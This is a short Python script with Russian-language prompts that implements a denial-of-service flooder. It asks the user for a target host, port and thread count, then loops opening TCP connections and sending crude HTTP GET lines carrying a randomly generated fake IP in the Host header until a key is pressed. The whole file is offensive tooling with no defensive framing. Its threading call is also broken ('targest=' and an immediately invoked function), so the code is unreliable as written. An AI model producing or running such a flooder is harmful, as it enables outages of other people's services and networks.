import threading
import socket
import keyboard
import random
import time


def what_to_ddos():
    wtd = input('введите цель для Dos?\n')
    return wtd


def get_port():
    port = int(input("Укажите порт\n"))
    return port


def h_many_thr():
    num_of_threads = int(input("Сколько потоков вы бы хотели?"))
    return num_of_threads


def kill(wtd, num_of_threads, fake_ip, port):
    def dos(wtd, port, fake_ip):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((wtd, port))
        sock.sendto(("GET /" + wtd + " HTTP/1.1\r\n").encode('ascii'), (wtd, port))
        sock.sendto(("HOST: " + fake_ip + " ").encode('ascii'), (wtd, port))
        print(f'[dos]Отправка пакетов {wtd}:{port}')
        sock.close()

    def attack(wtd, port, fake_ip):
        already_con = 0
        while True:
            if keyboard.is_pressed('s'):
                print(f'[dos]Нажата S {keyboard.is_pressed}')
                break
            else:
                dos(wtd, port, fake_ip)
                already_con += 1
                print(already_con)

    for i in range(num_of_threads):
        if keyboard.is_pressed('s'):
            print(f'[dos]Нажата S {keyboard.is_pressed}')
            break
        else:
            thread = threading.Thread(targest=attack(wtd, port, fake_ip))
            print(f'[dos]Какая то атака {thread}')
            thread.start()


def start():
    randomip = str(random.randint(1, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    fake_ip = str(randomip)
    wtd = what_to_ddos()
    port = get_port()
    num_of_threads = h_many_thr()
    print('Остановить "Esc"')
    print('Старт нажмите Enter')
    # time.sleep(5)
    keyboard.wait('enter')
    print(keyboard.wait)
    kill(wtd, num_of_threads, fake_ip, port)
    keyboard.wait("Esc")